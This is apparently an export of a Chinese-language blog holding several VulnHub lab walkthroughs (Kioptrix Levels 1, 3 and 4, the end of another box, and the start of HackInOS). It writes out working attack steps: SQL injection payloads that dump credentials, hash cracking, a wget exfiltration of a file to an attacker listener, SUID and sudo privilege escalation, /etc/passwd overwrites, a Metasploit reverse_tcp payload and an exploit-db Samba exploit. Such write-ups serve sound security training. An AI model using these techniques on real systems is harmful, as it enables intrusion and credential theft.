class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    server = HTTPServer((<span class="string">&#x27;0.0.0.0&#x27;</span>, <span class="number">8000</span>), UploadHandler)</span><br><span class="line">    server.serve_forever()</span><br></pre></td></tr></table></figure>

<p>启动接受服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">python3 upload_server.py</span><br></pre></td></tr></table></figure>

<p>在目标主机上执行：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget --post-file=secret.zip --header=&quot;Content-Type: application/octet-stream&quot; http://172.16.33.108:8000/</span><br></pre></td></tr></table></figure>

<p>接收成功，解压时发现需要密码</p>
<p><img src="/picture/image-20250322153224623.png" alt="image-20250322153224623"></p>
<p>将密码哈希保存为字典，使用 john 破译</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">zip2john secret.zip &gt; secret.txt  </span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt secret.txt</span><br></pre></td></tr></table></figure>

<p>又没跑出密码，看来得在目标主机里找了（</p>
<p><img src="/picture/image-20250322153600657.png" alt="image-20250322153600657"></p>
<p>再来枚举其他信息，看看有什么文件具有 SUID 权限：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">find / -perm -u=s -type f 2&gt;/dev/null</span><br></pre></td></tr></table></figure>

<p>看到了一个有趣的东西：</p>
<p><img src="/picture/image-20250322181011381.png" alt="image-20250322181011381"></p>
<p>尝试使用 wget 的 SUID 提权，由于需要写入文件，所以进入 tmp 目录</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">www-data@ubuntu:/var/www/html/wordpress$ <span class="built_in">cd</span> /tmp</span><br><span class="line">www-data@ubuntu:/tmp$ TF=$(<span class="built_in">mktemp</span>)</span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">chmod</span> +x <span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ <span class="built_in">echo</span> -e <span class="string">&#x27;#!/bin/sh -p\n/bin/sh -p 1&gt;&amp;0&#x27;</span> &gt;<span class="variable">$TF</span></span><br><span class="line">www-data@ubuntu:/tmp$ wget --use-askpass=<span class="variable">$TF</span> 0</span><br></pre></td></tr></table></figure>

<p>利用成功</p>
<p><img src="/picture/image-20250322181324853.png" alt="image-20250322181324853"></p>
<p>接下来就是进入 root 目录获得最终 flag</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># cd /root</span></span><br><span class="line"><span class="comment"># ls -la</span></span><br><span class="line"><span class="comment"># cat proof.txt</span></span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250322181504137.png" alt="image-20250322181504137"></p>
<p>或者可以使用 cp 命令</p>
<p>将目标主机上的 &#x2F;etc&#x2F;passwd 文件内容拷贝至主机，生成已知的密码哈希（123）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>

<p>在本地生成 passwd 文件，通过 goshs 上传至目标主机 tmp 目录，将上传的 passwd 拷贝覆盖原 &#x2F;etc&#x2F;passwd ，最后经过 su 提权</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cd /tmp</span><br><span class="line">wget http://10.8.0.90/passwd</span><br><span class="line">cp passwd /etc/passwd</span><br><span class="line">su # 输入密码 123</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250322202054503.png" alt="image-20250322202054503"></p>
<p>当然，直接 wget 覆盖 &#x2F;etc&#x2F;passwd 也可以</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">wget http://10.8.0.90/passwd -O /etc/passwd</span><br></pre></td></tr></table></figure>

<blockquote>
<p> 看来 secret.zip 是兔子洞，误导你的</p>
</blockquote>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 3 Walkthrough</title>
    <url>/2025/04/11/Kioptrix%20Level%203/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-3-Walkthrough"><a href="#Kioptrix-Level-3-Walkthrough" class="headerlink" title="Kioptrix Level 3 Walkthrough"></a>Kioptrix Level 3 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-12-3,24/">Kioptrix: Level 1.2 (#3)</a></p>
<p><img src="/picture/image-20250411115248512.png" alt="image-20250411115248512"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250411100915222.png" alt="image-20250411100915222"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.150</span><br></pre></td></tr></table></figure>

<p>发现开放 22，80 端口</p>
<p><img src="/picture/image-20250411100945596.png" alt="image-20250411100945596"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80 -A 192.168.186.150</span><br></pre></td></tr></table></figure>

<p>22 端口开放 SSH 服务，80 端口开放 HTTP 服务</p>
<p><img src="/picture/image-20250411101054246.png" alt="image-20250411101054246"></p>
<p>先来看 22 端口 SSH 服务，看看对应版本有无可直接利用的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit openssh 4.7</span><br></pre></td></tr></table></figure>

<p>展示没有发现什么可利用的</p>
<p><img src="/picture/image-20250411101243184.png" alt="image-20250411101243184"></p>
<p>再来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.150</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250411101722248.png" alt="image-20250411101722248"></p>
<p>&#x2F;gallery 目录似乎加载不完全</p>
<p><img src="/picture/image-20250411120940082.png" alt="image-20250411120940082"></p>
<p>查看源代码后发现，&#x2F;gallery 目录中的链接指向的是 Kioptrix3.com </p>
<p><img src="/picture/image-20250411121057034.png" alt="image-20250411121057034"></p>
<p>将该域名与 IP 绑定</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/hosts</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250411102117016.png" alt="image-20250411102117016"></p>
<p>再次访问，发现排序图片的站点</p>
<p><img src="/picture/image-20250411102228103.png" alt="image-20250411102228103"></p>
<p>使用任意一种排序，发现 url 中存在 id 参数可能有 sql 注入</p>
<p><img src="/picture/image-20250411102419344.png" alt="image-20250411102419344"></p>
<p>更改 id 参数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1&#x27;&quot; --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>

<p>触发 sql 报错，存在 sql 注入，且依据报错判断，是数字型注入</p>
<p><img src="/picture/image-20250411102602763.png" alt="image-20250411102602763"></p>
<p>使用 order by 判断列数</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=1 order by 6 --+&amp;sort=photoid#photos</span><br><span class="line">id=1 order by 7 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>

<p>最终判断为 6 列</p>
<p><img src="/picture/image-20250411103148390.png" alt="image-20250411103148390"></p>
<p><img src="/picture/image-20250411103207913.png" alt="image-20250411103207913"></p>
<p>判断回显点</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,2,3,4,5,6 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>

<p>回显点为 2，3</p>
<p><img src="/picture/image-20250411103316163.png" alt="image-20250411103316163"></p>
<p>读取数据库名称和用户</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,user(),database(),4,5,6 --+&amp;sort=photoid#photos</span><br></pre></td></tr></table></figure>

<p>数据库名为 gallery ，用户为 mysql 管理员</p>
<p><img src="/picture/image-20250411103754320.png" alt="image-20250411103754320"></p>
<p>读取数据表</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(table_name),3,4,5,6 from information_schema.tables where table_schema=&#x27;gallery&#x27; --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>

<p>发现用户数据表 gallarific_users 和 dev_accounts</p>
<p><img src="/picture/image-20250411104003162.png" alt="image-20250411104003162"></p>
<p>读取用户数据表字段名</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#x27;gallarific_users&#x27; --+&amp;sort=photoid#photos 3</span><br><span class="line">id=-1 union select 1,group_concat(column_name),3,4,5,6 from information_schema.columns where table_name=&#x27;dev_accounts&#x27; --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>

<p>发现 username 和 password</p>
<p><img src="/picture/image-20250411104241854.png" alt="image-20250411104241854"></p>
<p><img src="/picture/image-20250411104915106.png" alt="image-20250411104915106"></p>
<p>读取 username 和 password</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">id=-1 union select 1,username,password,4,5,6 from gallarific_users --+&amp;sort=photoid#photos 3</span><br><span class="line">id=-1 union select 1,username,password,4,5,6 from dev_accounts --+&amp;sort=photoid#photos 3</span><br></pre></td></tr></table></figure>

<p>用户名密码为 admin&#x2F;n0t7t1k4</p>
<p><img src="/picture/image-20250411104444248.png" alt="image-20250411104444248"></p>
<p>用户名密码为 dreg&#x2F;0d3eccfb887aabd50f243b3f155c0f85 和 loneferret&#x2F;5badcaf789d3d1d09794d8f021f40f0e</p>
<p><img src="/picture/image-20250411105017857.png" alt="image-20250411105017857"></p>
<p>经过尝试，第一个账号密码似乎是 MySQL 账号密码，SSH ，后台，phpmyadmin 均不能能登陆</p>
<p>尝试使用字典模式破解 md5 加密</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">hashcat -m 0 0d3eccfb887aabd50f243b3f155c0f85 /usr/share/wordlists/rockyou.txt</span><br><span class="line">hashcat -m 0 5badcaf789d3d1d09794d8f021f40f0e /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>破解出来为</p>
<p>dreg&#x2F;Mast3r</p>
<p><img src="/picture/image-20250411110138560.png" alt="image-20250411110138560"></p>
<p>loneferret&#x2F;starwars</p>
<p><img src="/picture/image-20250411110245557.png" alt="image-20250411110245557"></p>
<p>尝试使用 SSH 登陆，两者均成功</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa dreg@192.168.186.150</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250411113940331.png" alt="image-20250411113940331"></p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa loneferret@192.168.186.150</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250411113902901.png" alt="image-20250411113902901"></p>
<p>发现 dreg 不能执行 sudo -l 命令而 loneferret 可以，且可以不用密码执行 sudo ht</p>
<p><img src="/picture/image-20250411114146183.png" alt="image-20250411114146183"></p>
<p>运行 ht ，报错</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">loneferret@Kioptrix3:~$ sudo ht</span><br><span class="line">Error opening terminal: xterm-256color.</span><br></pre></td></tr></table></figure>

<p>使用 export TERM&#x3D;xterm 解决</p>
<p><img src="/picture/image-20250411114359115.png" alt="image-20250411114359115"></p>
<p>发现是一个编辑器，既然已 root 身份运行，直接更改 &#x2F;etc&#x2F;passwd 中 root 密码即可</p>
<p><img src="/picture/image-20250411114452231.png" alt="image-20250411114452231"></p>
<p>生成已知的密码哈希（123）</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(kali㉿kali)-[~]</span><br><span class="line">└─$ openssl passwd -1 123</span><br><span class="line">$1$/l/LdaOy<span class="variable">$E0kBkOBauSctDWdECVk9r</span>.</span><br></pre></td></tr></table></figure>

<p>f3 选择打开 &#x2F;etc&#x2F;passwd</p>
<p><img src="/picture/image-20250411114604572.png" alt="image-20250411114604572"></p>
<p>替换 root 密码</p>
<p><img src="/picture/image-20250411114643634.png" alt="image-20250411114643634"></p>
<p>f2 保存 f10 退出后，直接使用 su 切换为 root 身份</p>
<p><img src="/picture/image-20250411114820430.png" alt="image-20250411114820430"></p>
<p>读取 Congrats.txt </p>
<p><img src="/picture/image-20250411114915906.png" alt="image-20250411114915906"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 1 Walkthrough</title>
    <url>/2025/04/10/Kioptrix%20Level%201/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-1-Walkthrough"><a href="#Kioptrix-Level-1-Walkthrough" class="headerlink" title="Kioptrix Level 1 Walkthrough"></a>Kioptrix Level 1 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-1-1,22/">Kioptrix: Level 1 (#1)</a></p>
<p><img src="/picture/image-20250409203110907.png" alt="image-20250409203110907"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250409091929430.png" alt="image-20250409091929430"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.146</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250409092017367.png" alt="image-20250409092017367"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80,111,139,443,32768 -A 192.168.186.146</span><br></pre></td></tr></table></figure>

<p>发现 SSH、HTTP、RPC、SMB、HTTPS 和未知服务的端口</p>
<p><img src="/picture/image-20250409092138040.png" alt="image-20250409092138040"></p>
<p>先来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.146/</span><br></pre></td></tr></table></figure>

<p>发现有部分页面重定向 IP 至 127.0.0.1 </p>
<p><img src="/picture/image-20250409092236680.png" alt="image-20250409092236680"></p>
<p>使用 SSH 本地端口转发</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo systemctl start ssh</span><br><span class="line">ssh -CNfg -L 80:192.168.186.146:80 kali@127.0.0.1</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250409092329968.png" alt="image-20250409092329968"></p>
<p>这样访问 127.0.0.1 就是目标 IP 地址了</p>
<p><img src="/picture/image-20250409092631834.png" alt="image-20250409092631834"></p>
<p>看来看去没有泄露敏感信息</p>
<p>再来看看 111 端口 RPC 服务，对开放的 service 进行枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcinfo -p 192.168.186.146</span><br></pre></td></tr></table></figure>

<p>发现 status 服务，与 nmap 扫描出来开放的端口一致</p>
<p><img src="/picture/image-20250409170610467.png" alt="image-20250409170610467"></p>
<p>尝试使用 rpcinfo 远程连接</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpcinfo -T tcp 192.168.186.146 32768</span><br><span class="line">rpcinfo -T udp 192.168.186.146 32768</span><br></pre></td></tr></table></figure>

<p>发现该端口未注册却开放(?) ， 有点意思</p>
<p><img src="/picture/image-20250409170729489.png" alt="image-20250409170729489"></p>
<p>试试看直接连接能否有响应</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nc -nv 192.168.186.146 32768 </span><br></pre></td></tr></table></figure>

<p>看来没有…</p>
<p><img src="/picture/image-20250409170907523.png" alt="image-20250409170907523"></p>
<p>拿来看 139 端口，使用 enum4linux 对目标主机 SMB 服务做基础枚举</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">enum4linux -a 192.168.186.146</span><br></pre></td></tr></table></figure>

<p>发现可以用空用户名和空密码登陆</p>
<p><img src="/picture/image-20250409171116368.png" alt="image-20250409171116368"></p>
<p>发现了文件共享目录</p>
<p><img src="/picture/image-20250409171145582.png" alt="image-20250409171145582"></p>
<p>尝试远程挂载 IPC$ 目录</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.186.146/IPC$ -U &quot;&quot; -N</span><br></pre></td></tr></table></figure>

<p>尝试枚举文件，失败</p>
<p><img src="/picture/image-20250409172808928.png" alt="image-20250409172808928"></p>
<blockquote>
<p>此错误通常是 Samba 服务端配置引起的，看来 &#x2F;IPC$ 并不能让我们完全访问</p>
</blockquote>
<p>再来看看 ADMIN$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">smbclient //192.168.186.146/ADMIN$ -U &quot;&quot; -N</span><br></pre></td></tr></table></figure>

<p>也失败了</p>
<p><img src="/picture/image-20250409172921297.png" alt="image-20250409172921297"></p>
<p>那我们试试 nmap 自带脚本扫描目标 Samba 服务吧</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap --script smb-* -p 139 192.168.186.146</span><br></pre></td></tr></table></figure>

<p>发现可利用漏洞：CVE-2009-3103</p>
<p><img src="/picture/image-20250409173340960.png" alt="image-20250409173340960"></p>
<p>使用 msf 直接利用 CVE-2009-3103 漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─# msfconsole</span><br><span class="line">...</span><br><span class="line">msf6 &gt; search MS09_050</span><br><span class="line">msf6 &gt; use exploit/windows/smb/ms09_050_smb2_negotiate_func_index</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; options</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set payload windows/meterpreter/reverse_tcp</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set rhost 192.168.186.146</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; set RPORT 139</span><br><span class="line">msf6 exploit(windows/smb/ms09_050_smb2_negotiate_func_index) &gt; run</span><br></pre></td></tr></table></figure>

<p>可惜利用失败了</p>
<p><img src="/picture/image-20250409202425206.png" alt="image-20250409202425206"></p>
<p><img src="/picture/image-20250409202523771.png" alt="image-20250409202523771"></p>
<p>也可以使用 msf 发现对应 Samba 服务版本</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kali)-[~]</span><br><span class="line">└─<span class="comment"># msfconsole</span></span><br><span class="line">...</span><br><span class="line">msf6 &gt; use auxiliary/scanner/smb/smb_version </span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; <span class="built_in">set</span> RHOST 192.168.186.146</span><br><span class="line">RHOST =&gt; 192.168.186.146</span><br><span class="line">msf6 auxiliary(scanner/smb/smb_version) &gt; run</span><br><span class="line"></span><br><span class="line">[*] 192.168.186.146:139   - SMB Detected (versions:) (preferred dialect:) (signatures:optional)</span><br><span class="line">[*] 192.168.186.146:139   -   Host could not be identified: Unix (Samba 2.2.1a)</span><br><span class="line">[*] 192.168.186.146:      - Scanned 1 of 1 hosts (100% complete)</span><br><span class="line">[*] Auxiliary module execution completed</span><br></pre></td></tr></table></figure>

<p>结果搜索发现可以利用 <a href="https://www.exploit-db.com/exploits/10">https://www.exploit-db.com/exploits/10</a> 的 payload</p>
<p><img src="/picture/image-20250409195041900.png" alt="image-20250409195041900"></p>
<p>将脚本保存为 exp.c 文件，并静态编译，兼容低版本</p>
<p><img src="/picture/image-20250409195439627.png" alt="image-20250409195439627"></p>
<p>执行 exp 脚本</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">./exp -b 0 192.168.186.146</span><br></pre></td></tr></table></figure>

<p>提权成功</p>
<p><img src="/picture/image-20250409195553008.png" alt="image-20250409195553008"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>Kioptrix Level 4 Walkthrough</title>
    <url>/2025/04/12/Kioptrix%20Level%204/</url>
    <content><![CDATA[<h1 id="Kioptrix-Level-4-Walkthrough"><a href="#Kioptrix-Level-4-Walkthrough" class="headerlink" title="Kioptrix Level 4 Walkthrough"></a>Kioptrix Level 4 Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里：<a href="https://www.vulnhub.com/entry/kioptrix-level-13-4,25/">Kioptrix: Level 1.3 (#4)</a></p>
<p><img src="/picture/image-20250412171255979.png" alt="image-20250412171255979"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>确定存活的主机</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sP 192.168.186.0/24</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250412152621986.png" alt="image-20250412152621986"></p>
<p>对目标 IP 进行端口发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p- 192.168.186.151</span><br></pre></td></tr></table></figure>

<p>发现开放 22，80，139，445 端口</p>
<p><img src="/picture/image-20250412152646226.png" alt="image-20250412152646226"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -p 22,80,139,445 -A 192.168.186.151</span><br></pre></td></tr></table></figure>

<p>22 端口开放 SSH 服务，80 端口开放 HTTP 服务，139 和 445 都是 SMB 服务</p>
<p><img src="/picture/image-20250412152726245.png" alt="image-20250412152726245"></p>
<p>先来看 22 端口 SSH 服务，看看对应版本有无可直接利用的漏洞</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">searchsploit openssh 4.7</span><br></pre></td></tr></table></figure>

<p>暂时没有发现什么可利用的漏洞</p>
<p><img src="/picture/image-20250411101243184-1744442900987-9.png" alt="image-20250411101243184"></p>
<p>再来看 80 端口，进行目录扫描</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://192.168.186.150</span><br></pre></td></tr></table></figure>

<p>发现可疑目录</p>
<p><img src="/picture/image-20250412152915346.png" alt="image-20250412152915346"></p>
<p>&#x2F;images 目录下有张 cartoon_goat.png 图片</p>
<p><img src="/picture/image-20250412153228089.png" alt="image-20250412153228089"></p>
<p>将其保存至本机，看看图片是否泄露信息</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">strings cartoon_goat.png</span><br></pre></td></tr></table></figure>

<p>可惜没有</p>
<p><img src="/picture/image-20250412153119443.png" alt="image-20250412153119443"></p>
<p>直接访问 80 端口，发现是登陆页面，源码也没泄露关键信息</p>
<p><img src="/picture/image-20250412153336276.png" alt="image-20250412153336276"></p>
<p>尝试弱口令登陆，发现登陆失败则会 302 重定向至 &#x2F;checklogin.php</p>
<p><img src="/picture/image-20250412153520258.png" alt="image-20250412153520258"></p>
<p>最后来看 &#x2F;database.sql ，发现是将 john&#x2F;1234 插入 member 的 table 中，泄露账户和密码</p>
<p><img src="/picture/image-20250412153636173.png" alt="image-20250412153636173"></p>
<p>尝试使用 john&#x2F;1234 登陆 ssh </p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>

<p>登陆失败</p>
<p><img src="/picture/image-20250412153827171.png" alt="image-20250412153827171"></p>
<p>登陆后台，也失败</p>
<p><img src="/picture/image-20250412153932406.png" alt="image-20250412153932406"></p>
<p>既然都有数据库，那是否存在 SQL 注入呢？经过探查发现，在 mypassword 处发现单引号字符型注入</p>
<p><img src="/picture/image-20250412154217894.png" alt="image-20250412154217894"></p>
<p>试试看万能密码？由于是 post 型，所以要将注释符更改为 %23 (#)</p>
<p><img src="/picture/image-20250412154551345.png" alt="image-20250412154551345"></p>
<p>登陆成功，获得 john 真正的密码</p>
<p><img src="/picture/image-20250412154435322.png" alt="image-20250412154435322"></p>
<blockquote>
<p>或者可以执行如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#x27; or 1=1 into outfile &#x27;/var/www/user.txt&#x27; #</span><br></pre></td></tr></table></figure>

<p>获得用户和密码</p>
<p><img src="/picture/image-20250412170847009.png" alt="image-20250412170847009"></p>
<p>该方法局限性在于网站根目录不一定是 &#x2F;var&#x2F;www</p>
</blockquote>
<p>尝试使用 ssh 远程登陆</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh -o HostKeyAlgorithms=+ssh-rsa john@192.168.186.151</span><br></pre></td></tr></table></figure>

<p>登陆成功，但似乎是在一个受限的环境中</p>
<p><img src="/picture/image-20250412154802099.png" alt="image-20250412154802099"></p>
<p>在这种情况下，需要逃逸 restrict shell ，可以尝试使用如下命令</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">ssh username@IP -t &quot;/bin/bash&quot; or &quot;/bin/sh&quot;</span><br><span class="line">ssh username@IP -t &quot;bash --noprofile&quot;</span><br><span class="line">ssh username@IP -t &quot;() &#123; :; &#125;; /bin/bash&quot;</span><br></pre></td></tr></table></figure>

<p>都失败了…</p>
<p>由于可以执行 echo ，尝试 <code>echo os.system(&quot;/bin/bash&quot;)</code> 逃逸，逃逸成功</p>
<p><img src="/picture/image-20250412155308111.png" alt="image-20250412155308111"></p>
<p>接下来是提权，先查看目标主机真实开放的端口，发现有 3306 端口</p>
<p><img src="/picture/image-20250412161508849.png" alt="image-20250412161508849"></p>
<p>同时能发现 MySQL 以 root 身份运行</p>
<p><img src="/picture/image-20250412162025117.png" alt="image-20250412162025117"></p>
<p>那就去 web 网站目录看看有没有泄露 MySQL 账户密码，在 checklogin.php 出找到 root 账户的密码为空</p>
<p><img src="/picture/image-20250412162244952.png" alt="image-20250412162244952"></p>
<p>登陆 MySQL 服务</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">mysql -h localhost -u root -p</span><br></pre></td></tr></table></figure>

<p><img src="/picture/image-20250412162751992.png" alt="image-20250412162751992"></p>
<p>在查看 mysql 数据库时发现存在 func 表</p>
<p><img src="/picture/image-20250412163002390.png" alt="image-20250412163002390"></p>
<p>且表中含有执行命令的函数</p>
<p><img src="/picture/image-20250412163052071.png" alt="image-20250412163052071"></p>
<p>将 john 加入 root 用户组</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">select sys_exec(&#x27;usermod -aG admin john&#x27;);</span><br></pre></td></tr></table></figure>

<p>使用 sudo su 切换为 root 身份，密码为 MyNameIsJohn ，提权成功</p>
<p><img src="/picture/image-20250412170346429.png" alt="image-20250412170346429"></p>
<p>获得 flag</p>
<p><img src="/picture/image-20250412170449450.png" alt="image-20250412170449450"></p>
]]></content>
      <categories>
        <category>Penetration Testing</category>
      </categories>
      <tags>
        <tag>Penetration Testing</tag>
        <tag>vulnhub</tag>
      </tags>
  </entry>
  <entry>
    <title>HackInOS Walkthrough</title>
    <url>/2025/03/25/HackInOS/</url>
    <content><![CDATA[<h1 id="HackInOS-Walkthrough"><a href="#HackInOS-Walkthrough" class="headerlink" title="HackInOS Walkthrough"></a>HackInOS Walkthrough</h1><h2 id="Box-Info"><a href="#Box-Info" class="headerlink" title="Box Info"></a>Box Info</h2><p>官网在这里 <a href="https://www.vulnhub.com/entry/hackinos-1,295/">HackInOS: 1</a></p>
<p><img src="/picture/image-20250325171754863.png" alt="image-20250325171754863"></p>
<h2 id="The-Hack"><a href="#The-Hack" class="headerlink" title="The Hack"></a>The Hack</h2><p>先对目标主机进行端口发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p- 172.16.33.66</span><br></pre></td></tr></table></figure>

<p>发现开放 22 和 8000 端口</p>
<p><img src="/picture/image-20250325103311310.png" alt="image-20250325103311310"></p>
<p>对开放的端口进行应用版本发现</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p 22,8000 -A -T4 172.16.33.66</span><br></pre></td></tr></table></figure>

<p>22 端口对应的 SSH 版本较高，漏洞较少且利用较困难，8000 似乎是一个 WordPress 站点，还泄露了 robots.txt</p>
<p><img src="/picture/image-20250325104528460.png" alt="image-20250325104528460"></p>
<p>先来看 22 端口，尝试使用弱口令远程登陆 root 账号，同时看有没有泄露机密信息</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">ssh root@172.16.33.66</span><br></pre></td></tr></table></figure>

<p>可惜失败了</p>
<p><img src="/picture/image-20250325104911673.png" alt="image-20250325104911673"></p>
<p>看来 22 端口我们暂时拿他没办法了，那么就来看看 8000 端口吧</p>
<p>访问 robots.txt 中的 &#x2F;upload.php 目录，发现可以上传文件，有意思的是，无论传 PHP 文件还是图片，页面响应都为 <code>:)</code> </p>
